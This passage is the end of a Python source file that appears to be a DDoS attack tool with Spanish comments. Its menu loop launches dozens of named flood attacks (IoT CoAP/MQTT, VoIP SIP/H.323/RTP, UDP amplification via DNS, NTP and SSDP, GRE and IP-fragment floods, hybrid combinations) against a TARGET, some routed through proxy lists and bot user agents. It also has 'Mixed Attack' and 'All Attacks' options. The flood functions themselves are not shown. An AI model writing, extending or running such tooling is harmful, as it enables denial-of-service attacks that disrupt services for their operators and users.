                elif sub_choice == 23: start_attack_no_port(pop3_burst_flood, TARGET, duration)
                elif sub_choice == 24: start_attack_no_port(imap_mass_flood, TARGET, duration)
            elif choice == 7:  # Ataques IoT
                sub_choice = show_iot_menu()
                if sub_choice == 0: continue
                elif sub_choice == 1: start_attack_no_port(coap_burst_flood_iot, TARGET, duration)
                elif sub_choice == 2: start_attack_no_port(mqtt_mass_flood_iot, TARGET, duration)
                elif sub_choice == 3: start_attack_no_port(coap_mass_flood_iot, TARGET, duration)
                elif sub_choice == 4: start_attack_no_port(mqtt_burst_flood_iot, TARGET, duration)
                elif sub_choice == 5: start_attack_no_port(coap_random_flood_iot, TARGET, duration)
                elif sub_choice == 6: start_attack_no_port(mqtt_random_flood_iot, TARGET, duration)
                elif sub_choice == 7: start_attack_no_port(coap_high_rate_flood_iot, TARGET, duration)
                elif sub_choice == 8: start_attack_no_port(mqtt_high_rate_flood_iot, TARGET, duration)
                elif sub_choice == 9: start_attack_no_port(iot_ssdp_flood, TARGET, duration)
                elif sub_choice == 10: start_attack_no_port(iot_ssdp_burst_flood, TARGET, duration)
                elif sub_choice == 11: start_attack_no_port(iot_snmp_flood, TARGET, duration)
                elif sub_choice == 12: start_attack_no_port(iot_snmp_mass_flood, TARGET, duration)
                elif sub_choice == 13: start_attack_no_port(coap_mass_burst_flood, TARGET, duration)
            elif choice == 8:  # Ataques VoIP
                sub_choice = show_voip_menu()
                if sub_choice == 0: continue
                elif sub_choice == 1: start_attack_no_port(sip_high_rate_flood_voip, TARGET, duration)
                elif sub_choice == 2: start_attack_no_port(h323_flood, TARGET, duration)
                elif sub_choice == 3: start_attack_no_port(sip_mass_flood_voip, TARGET, duration)
                elif sub_choice == 4: start_attack_no_port(h323_burst_flood, TARGET, duration)
                elif sub_choice == 5: start_attack_no_port(sip_random_flood_voip, TARGET, duration)
                elif sub_choice == 6: start_attack_no_port(h323_mass_flood, TARGET, duration)
                elif sub_choice == 7: start_attack_no_port(rtp_flood, TARGET, duration)
                elif sub_choice == 8: start_attack_no_port(rtp_mass_flood, TARGET, duration)
                elif sub_choice == 9: start_attack_no_port(rtp_burst_flood, TARGET, duration)
                elif sub_choice == 10: start_attack_no_port(sip_random_burst_flood, TARGET, duration)
                elif sub_choice == 11: start_attack_no_port(h323_random_flood, TARGET, duration)
            elif choice == 9:  # Ataques Híbridos
                sub_choice = show_hybrid_exotic_menu()
                if sub_choice == 0: continue
                elif sub_choice == 1: start_attack(hybrid_http_udp_flood, TARGET, PORT, proxies, agents, duration)
                elif sub_choice == 2: start_attack(hybrid_tcp_http_flood, TARGET, PORT, proxies, agents, duration)
                elif sub_choice == 3: start_attack_no_port(hybrid_icmp_udp_flood, TARGET, duration)
                elif sub_choice == 4: start_attack(hybrid_http_sip_flood, TARGET, PORT, proxies, agents, duration)
                elif sub_choice == 5: start_attack_no_port(hybrid_udp_coap_flood, TARGET, duration)
                elif sub_choice == 6: start_attack_no_port(hybrid_tcp_mqtt_flood, TARGET, duration)
                elif sub_choice == 11: start_attack(hybrid_http_udp_burst_flood, TARGET, PORT, proxies, agents, duration)
                elif sub_choice == 12: start_attack_no_port(hybrid_tcp_sip_flood, TARGET, duration)
                elif sub_choice == 17: start_attack_no_port(hybrid_udp_rtp_flood, TARGET, duration)
                elif sub_choice == 18: start_attack_no_port(hybrid_icmp_coap_flood, TARGET, duration)
            elif choice == 10:  # Ataques Exóticos
                sub_choice = show_hybrid_exotic_menu()
                if sub_choice == 0: continue
                elif sub_choice == 7: start_attack_no_port(gre_flood, TARGET, duration)
                elif sub_choice == 8: start_attack_no_port(ip_fragment_flood, TARGET, duration)
                elif sub_choice == 9: start_attack_no_port(chargen_flood, TARGET, duration)
                elif sub_choice == 10: start_attack_no_port(qotd_flood, TARGET, duration)
                elif sub_choice == 13: start_attack_no_port(gre_burst_flood, TARGET, duration)
                elif sub_choice == 14: start_attack_no_port(ip_fragment_mass_flood, TARGET, duration)
                elif sub_choice == 15: start_attack_no_port(chargen_burst_flood, TARGET, duration)
                elif sub_choice == 16: start_attack_no_port(qotd_mass_flood, TARGET, duration)
                elif sub_choice == 19: start_attack_no_port(gre_mass_flood, TARGET, duration)
                elif sub_choice == 20: start_attack_no_port(ip_fragment_burst_flood, TARGET, duration)
            elif choice == 11:  # Ataques UDP
                sub_choice = show_udp_menu()
                if sub_choice == 0: continue
                elif sub_choice == 1: start_attack(udp_flood, TARGET, PORT, duration)
                elif sub_choice == 2: start_attack_no_port(udp_stun_flood, TARGET, duration)
                elif sub_choice == 3: start_attack(udp_fragment_flood, TARGET, PORT, duration)
                elif sub_choice == 4: start_attack_no_port(udp_dns_flood, TARGET, duration)
                elif sub_choice == 5: start_attack_no_port(udp_ntp_flood, TARGET, duration)
                elif sub_choice == 6: start_attack_no_port(udp_ssdp_flood, TARGET, duration)
                elif sub_choice == 7: start_attack(udp_mass_flood, TARGET, PORT, duration)
                elif sub_choice == 8: start_attack_no_port(udp_random_port_flood, TARGET, duration)
                elif sub_choice == 9: start_attack(udp_burst_flood, TARGET, PORT, duration)
                elif sub_choice == 10: start_attack_no_port(udp_dns_burst_flood, TARGET, duration)
                elif sub_choice == 11: start_attack_no_port(udp_ntp_mass_flood, TARGET, duration)
                elif sub_choice == 12: start_attack_no_port(udp_ssdp_burst_flood, TARGET, duration)
                elif sub_choice == 13: start_attack_no_port(udp_flood_multi_port, TARGET, duration)
                elif sub_choice == 14: start_attack_no_port(udp_stun_mass_flood, TARGET, duration)
                elif sub_choice == 15: start_attack(udp_random_payload_flood, TARGET, PORT, duration)
                elif sub_choice == 16: start_attack_no_port(udp_dns_random_flood, TARGET, duration)
                elif sub_choice == 17: start_attack_no_port(udp_ntp_burst_flood, TARGET, duration)
                elif sub_choice == 18: start_attack_no_port(udp_ssdp_random_flood, TARGET, duration)
                elif sub_choice == 19: start_attack(udp_flood_high_rate, TARGET, PORT, duration)
                elif sub_choice == 20: start_attack_no_port(udp_stun_burst_flood, TARGET, duration)
                elif sub_choice == 21: start_attack(udp_fragment_mass_flood, TARGET, PORT, duration)
                elif sub_choice == 22: start_attack_no_port(udp_dns_mass_flood, TARGET, duration)
                elif sub_choice == 23: start_attack_no_port(udp_ntp_random_flood, TARGET, duration)
                elif sub_choice == 24: start_attack_no_port(udp_ssdp_mass_flood, TARGET, duration)
            elif choice == 15:  # Mixed Attack
                mixed_attack(TARGET, PORT, proxies, agents, duration)
            elif choice == 16:  # All Attacks
                all_attacks(TARGET, PORT, proxies, agents, duration)


if __name__ == "__main__":
    main_control_loop(PROXY_LIST, BOT_AGENTS)



